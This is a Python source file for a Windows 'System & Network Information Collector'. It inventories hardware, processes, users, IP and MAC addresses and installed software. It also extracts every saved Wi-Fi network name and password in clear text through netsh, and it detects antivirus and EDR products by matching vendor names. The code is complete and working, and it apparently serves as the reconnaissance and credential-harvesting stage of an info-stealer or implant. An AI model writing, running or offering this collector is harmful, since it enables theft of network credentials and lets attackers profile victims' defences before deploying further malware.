"""
System & Network Information Collector
- Hardware: CPU, RAM, disks, external drives
- Network: local/public IP, MAC, Wi‑Fi SSIDs/passwords
- Software: OS version, installed apps, running processes, AV/EDR detection
"""
import os
import socket
import platform
import json
import subprocess
import winreg
import urllib.request
import uuid

try:
    import psutil
except ImportError:
    psutil = None

class SystemCollector:
    @staticmethod
    def collect():
        info = {}
        info['device_id'] = SystemCollector._get_device_id()
        info['hostname'] = socket.gethostname()
        info['os'] = platform.system()
        info['os_version'] = platform.version()
        info['os_release'] = platform.release()
        info['architecture'] = platform.machine()
        info['cpu'] = platform.processor()
        if psutil:
            info['cpu_cores'] = psutil.cpu_count()
            info['cpu_usage'] = psutil.cpu_percent(interval=0.5)
            info['memory'] = SystemCollector._get_memory()
            info['disks'] = SystemCollector._get_disks()
            info['running_processes'] = SystemCollector._get_processes()
            info['network_interfaces'] = SystemCollector._get_network_interfaces()
            info['users'] = SystemCollector._get_users()
            info['uptime'] = SystemCollector._get_uptime()
        else:
            info['memory'] = {}
            info['disks'] = []
            info['running_processes'] = []
            info['network_interfaces'] = []
            info['users'] = []
            info['uptime'] = None

        info['public_ip'] = SystemCollector._get_public_ip()
        info['local_ip'] = SystemCollector._get_local_ip()
        info['mac'] = SystemCollector._get_mac()
        info['wifi_profiles'] = SystemCollector._get_wifi_profiles()
        info['installed_software'] = SystemCollector._get_installed_software()
        info['security_tools'] = SystemCollector._detect_security_tools()
        return info

    @staticmethod
    def _get_device_id():
        try:
            return str(uuid.getnode())
        except:
            return socket.gethostname()

    @staticmethod
    def _get_memory():
        mem = psutil.virtual_memory()
        return {
            "total_gb": round(mem.total / (1024**3), 2),
            "available_gb": round(mem.available / (1024**3), 2),
            "used_gb": round(mem.used / (1024**3), 2),
            "percent": mem.percent
        }

    @staticmethod
    def _get_disks():
        disks = []
        for part in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(part.mountpoint)
                disks.append({
                    "mount": part.mountpoint,
                    "total_gb": round(usage.total / (1024**3), 2),
                    "used_gb": round(usage.used / (1024**3), 2),
                    "free_gb": round(usage.free / (1024**3), 2),
                    "percent": usage.percent
                })
            except:
                continue
        return disks

    @staticmethod
    def _get_network_interfaces():
        interfaces = []
        for name, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    interfaces.append({"name": name, "ip": addr.address})
        return interfaces

    @staticmethod
    def _get_processes():
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'exe', 'username']):
            try:
                processes.append(proc.info)
            except:
                continue
        return processes

    @staticmethod
    def _get_users():
        users = []
        for user in psutil.users():
            users.append({"name": user.name, "host": user.host, "started": user.started})
        return users

    @staticmethod
    def _get_uptime():
        try:
            return psutil.boot_time()
        except:
            return None

    @staticmethod
    def _get_public_ip():
        try:
            return urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()
        except:
            return None

    @staticmethod
    def _get_local_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    @staticmethod
    def _get_mac():
        try:
            mac = uuid.getnode()
            return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return None

    @staticmethod
    def _get_wifi_profiles():
        """Saved Wi‑Fi SSIDs and passwords via netsh"""
        profiles = []
        try:
            output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, stderr=subprocess.DEVNULL)
            import re
            ssids = re.findall(r'All User Profile\s*:\s*(.+)', output)
            for ssid in ssids:
                ssid = ssid.strip()
                try:
                    result = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True, text=True, stderr=subprocess.DEVNULL)
                    pwd_match = re.search(r'Key Content\s*:\s*(.+)', result)
                    password = pwd_match.group(1).strip() if pwd_match else None
                    profiles.append({"ssid": ssid, "password": password})
                except:
                    profiles.append({"ssid": ssid, "password": None})
        except:
            pass
        return profiles

    @staticmethod
    def _get_installed_software():
        software = []
        registry_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]
        for hkey, path in registry_paths:
            try:
                key = winreg.OpenKey(hkey, path)
                i = 0
                while True:
                    try:
                        sub = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(hkey, path + "\\" + sub)
                        name = winreg.QueryValueEx(subkey, "DisplayName")[0] if winreg.QueryValueEx(subkey, "DisplayName")[0] else ""
                        if name:
                            version = winreg.QueryValueEx(subkey, "DisplayVersion")[0] if winreg.QueryValueEx(subkey, "DisplayVersion")[0] else ""
                            software.append({"name": name, "version": version})
                        i += 1
                    except WindowsError:
                        break
            except:
                continue
        return software

    @staticmethod
    def _detect_security_tools():
        """Check running processes and installed software for AV/EDR names"""
        security_terms = ['defender', 'sentinel', 'crowdstrike', 'carbon black', 'cylance', 'sophos', 'symantec', 'mcafee', 'trend', 'kaspersky', 'bitdefender', 'avast', 'avg']
        detected = []
        if psutil:
            for proc in psutil.process_iter(['name']):
                try:
                    name = proc.info['name'].lower()
                    for term in security_terms:
                        if term in name:
                            detected.append(proc.info['name'])
                            break
                except:
                    continue
        # also check installed software
        for app in SystemCollector._get_installed_software():
            app_name = app['name'].lower()
            for term in security_terms:
                if term in app_name:
                    detected.append(app['name'])
                    break
        return list(set(detected))
